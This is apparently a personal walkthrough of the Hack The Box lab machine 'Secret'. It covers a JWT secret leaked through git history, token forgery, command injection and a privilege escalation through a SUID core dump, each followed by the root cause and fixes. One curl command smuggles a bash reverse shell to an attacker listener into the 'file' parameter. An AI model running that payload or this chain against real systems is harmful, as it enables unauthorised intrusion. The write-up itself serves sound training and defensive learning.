# Secret — HTB Easy Linux

**Chain:** web + exposed `.git` → leaked JWT secret from git history → forge admin token → authenticated command injection → shell as dasith → SUID `count` binary + core-dump → root

**Date:** 2026-07-18 · Easy · **user + root owned**

---

## Recon

```
nmap -p- --min-rate 5000 <IP>
nmap -sCV <IP>
```

- **80** — web app (Node.js / Express)
- **3000** — the API (Node.js), same app

The site offers a **downloadable source archive**. Unpacking it exposes a **`.git`** folder — the full repo history ships with the source.

## Foothold — leaked secret in git history → JWT forge → command injection

Shipped `.git` means the commit history is readable:

```
git log --oneline
git show <commit>   # the commit that "removes sensitive information"
```

An earlier commit committed the **JWT signing secret** (env/config variable); a later commit "removed" it — but git history still holds it. Recovered the secret from the diff.

With the signing secret, JWT auth is fully forgeable. `/api/logs` requires a token whose identity is the **admin** (`theadmin`). Forged a token with that identity, signed with the leaked secret.

`/api/logs` is **vulnerable to command injection** via its `file` parameter — reachable only with an admin token. Combined forged token + injection into a reverse shell:

```
curl -G "http://<IP>:3000/api/logs" \
  -H "auth-token: <forged-admin-JWT>" \
  --data-urlencode "file=; bash -c 'bash -i >& /dev/tcp/<TUN0>/4441 0>&1'"
```

Caught on `nc -lvn 4441` → shell as **dasith**.

```
cat /home/dasith/user.txt
```

**Root causes (foothold):**
- Secrets committed to git — "removing" later does NOT remove from history. → never commit secrets; rotate exposed ones; scan history.
- Shipping `.git` with source leaks the whole history. → don't publish `.git`.
- Forgeable JWT once the signing key leaks — auth collapses entirely. → protect signing keys; rotate on exposure.
- Command injection on `/api/logs` `file` param → user input reaches a shell. → validate/sanitise; never interpolate input into a shell.

> Identity note: the whole foothold is an **identity failure** — a leaked signing key turns JWT auth into "forge any user." Directly relevant to agent/token identity work.

## Root — SUID `count` binary + core dump

```
find / -perm -4000 2>/dev/null
# non-default: /opt/count  (root-owned, SUID)
```

`count` reads privileged files while running as root. Force it to **dump core** mid-read; the dump retains root-readable data. Core dumps land in the crash directory (`/var/crash`, Ubuntu apport):

```
apport-unpack /var/crash/<dump> /tmp/out
strings /tmp/out/CoreDump    # recover root-readable content
```

→ recovered root's data from the dump.

```
cat /root/root.txt
```

**Root cause (privesc):** a SUID-root binary reading privileged data + readable core dumps = low-priv user extracts root data from a crash. → drop unneeded SUID; restrict dumps (`fs.suid_dumpable=0`, `ulimit -c 0`); audit `find / -perm -4000`.

## Notes for the report
- Exposed `.git` is the whole game — source distribution leaked history + secrets. Always check for `.git`.
- Any committed secret is compromised forever, even if "removed" later. Rotate.
- Two distinct root causes: identity/secret failure (foothold) and SUID + core-dump exposure (privesc). Different layers, different fixes.
- New privesc pattern vs cron/SUID-bash: abusing a *custom* SUID binary's crash behaviour to leak root data via core dumps.

## Root causes (interview-ready)
1. Secret in git history → JWT forgery. → secret hygiene, history scanning, key rotation.
2. `.git` shipped with source → full disclosure. → don't publish `.git`.
3. Command injection on admin `/api/logs`. → input validation, no shell interpolation.
4. SUID-root `count` + readable core dumps → root data disclosure. → minimise SUID, restrict dumps.
- Maps to OWASP A01 (Broken Access Control / JWT), A03 (Injection), A05 (Misconfig), A07 (Auth failures). STRIDE: Spoofing, EoP, Info Disclosure.

## Tools
`nmap` · `git log`/`git show` · JWT forging (leaked HS256 secret) · `curl` · `nc` · `find -perm -4000` · `apport-unpack`/`strings`

---
*Note to self: swap <IP>/<TUN0> for placeholders, confirm exact crash signal + core path, redact any live tokens before publishing.*
